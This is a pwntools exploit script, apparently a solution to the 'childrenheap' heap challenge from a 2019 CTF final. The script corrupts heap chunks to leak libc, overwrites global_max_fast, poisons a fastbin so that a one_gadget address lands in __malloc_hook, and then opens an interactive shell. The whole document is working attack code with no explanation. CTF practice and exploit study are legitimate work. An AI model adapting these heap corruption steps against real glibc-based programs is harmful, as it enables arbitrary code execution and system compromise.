from pwn import *
context(arch='amd64', os='linux', log_level='debug')
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
context.terminal = ['tmux','splitw','-h']
debug = 1
r = process('./data/bin/heap23_31_cscctf_2019_final_childrenheap')
elf = ELF('./data/bin/heap23_31_cscctf_2019_final_childrenheap')
libc = elf.libc
menu = '>> '
one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

def add(index, size, content):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Size: ', str(size))
    r.sendafter('Content: ', content)

def show(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index: ', str(index))

def edit(index, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index: ', str(index))
    r.sendafter('Content: ', content)

def delete(index):
    r.sendlineafter(menu, '4')
    r.sendlineafter('Index: ', str(index))

for i in range(4):add(i, 0xf8, 'a')

add(4, 0xf8, 'aaaa');add(5, 0x68, 'aaaa');add(6, 0xf8, 'aaaa');add(7, 0x60, 'aaaa')
delete(0)
p1 = b'a' * 0xf0 + p64(0x200);edit(1, p1)
delete(2)
add(0, 0xf8, 'aaaa')
show(1);r.recvuntil(b'content: ');malloc_hook = u64(r.recv(6).ljust(8, b'\x00')) - 88 - 0x10;libc.address = malloc_hook - libc.sym['__malloc_hook']
add(2, 0x10, 'a')
global_max_fast = libc.address + 0x3c67f8;p1 = p64(0) * 3 + p64(0x71) + p64(0) + p64(global_max_fast - 0x10);p1 = p1.ljust(0x88, b'\x00');p1 += p64(0x71);edit(1, p1)
add(8, 0x60, 'aaa')
delete(8)
edit(1, p64(0) * 3 + p64(0x71) + p64(malloc_hook - 0x23))
add(9, 0x60, 'aaaa')
one_gadget = one[2] + libc.address;p2 = b'\x00' * 0x13 + p64(one_gadget);add(10, 0x60, p2)
delete(1)
delete(2)
r.interactive()